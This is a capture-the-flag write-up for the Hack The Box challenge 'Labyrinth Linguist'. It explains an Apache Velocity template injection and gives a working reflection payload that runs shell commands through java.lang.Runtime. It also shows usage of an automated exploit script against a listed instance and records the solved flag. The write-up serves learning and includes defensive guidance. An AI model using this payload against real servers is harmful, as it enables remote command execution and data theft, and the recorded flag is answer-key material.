# Labyrinth Linguist (Hack The Box) - Professional PoC Writeup

## Challenge Profile

| Field | Value |
|---|---|
| Challenge | Labyrinth Linguist |
| Category | Web |
| Difficulty | Easy |
| Primary dropped file | `web_labyrinth_linguist (1).zip` |
| Core vulnerability | Apache Velocity SSTI |

## Scope And Ethics

This material is for authorized CTF infrastructure only. Do not run this PoC
against systems you do not own or have explicit permission to test.

## Technical Summary

The backend reads an HTML template, replaces the marker `TEXT` with user input,
and then parses the result with Apache Velocity. This makes user input executable
as template code. Using Velocity object access and Java reflection, we can reach
`java.lang.Runtime`, execute `cat /flag.txt`, and print command output.

## Vulnerable Behavior

1. User input is inserted before template parsing.
2. Velocity expressions are evaluated server-side.
3. Reflection primitives are reachable from template context.
4. Command output is rendered into HTTP response.

## Manual Verification Steps

1. Send harmless SSTI arithmetic probe:

```text
#set($x=7*7)$x
```

2. Confirm rendered output contains `49`.

3. Send reflection payload to execute command:

```text
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime').getRuntime())#set($p=$rt.exec('cat /flag.txt'))#set($sc=$x.class.forName('java.util.Scanner').getConstructor($x.class.forName('java.io.InputStream')).newInstance($p.getInputStream()).useDelimiter('\\A'))$sc.next()
```

4. Extract `HTB{...}` from response HTML.

## Automated PoC

Script:
`labyrinth_linguist_poc.sh`

### Usage

```bash
cd "/home/eliah/Desktop/CTF/HackTheBox/Labyrinth_Linguist"
chmod +x labyrinth_linguist_poc.sh
./labyrinth_linguist_poc.sh http://154.57.164.76:30854/
```

### Common examples

```bash
./labyrinth_linguist_poc.sh http://154.57.164.76:30854/
./labyrinth_linguist_poc.sh --host 154.57.164.76 --port 30854 --verbose
./labyrinth_linguist_poc.sh --host 154.57.164.76 --port 30854 --json
```

## Options

- `--base-url <url>`: target URL including scheme.
- `--host <host>` + `--port <port>`: alternative target input.
- `--timeout <seconds>`: request timeout, default `20`.
- `--json`: machine-readable JSON output.
- `--verbose`: print debug details.
- `-h`, `--help`: show usage help.

## Exit Codes

- `0`: exploit succeeded and flag extracted.
- `2`: invalid CLI arguments.
- `3`: connectivity/request failure.
- `4`: flag not found in response.

## Why The Exploit Works

- Untrusted input is parsed as Velocity template code.
- Template execution context allows deep Java introspection.
- Reflection exposes runtime command execution path.
- Response rendering leaks command output directly.

## Defensive Guidance

- Never parse templates that include untrusted raw input.
- Use strict escaping and treat input as data only.
- Disable or sandbox dangerous reflection/runtime access paths.
- Prefer safe rendering with explicit allowlists.

## Result Note

Flag values are instance-specific. The format remains `HTB{...}`.

## Final Flag

Target instance: `http://154.57.164.76:30854`  
Solved on: `2026-04-02`  
Flag: `HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!_1cc2f007115c81e33a00d3dfc1e8f1ee}`
